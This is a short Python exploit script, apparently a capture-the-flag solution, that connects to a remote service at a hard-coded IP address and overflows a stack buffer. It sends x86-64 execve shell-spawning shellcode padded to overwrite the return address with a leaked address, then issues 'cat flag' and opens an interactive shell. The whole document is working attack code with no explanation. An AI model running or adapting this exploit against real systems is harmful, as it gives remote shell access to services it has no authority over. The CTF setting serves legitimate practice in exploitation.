from pwn import *

r = remote('140.110.112.218', 2119)
addr = int(r.recvuntil(b'\n').split(b' ')[-1].strip(), 16)
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

log.info(hex(addr))
r.sendline(shellcode.ljust(0x78) + p64(addr))

r.sendline("cat flag")
r.interactive()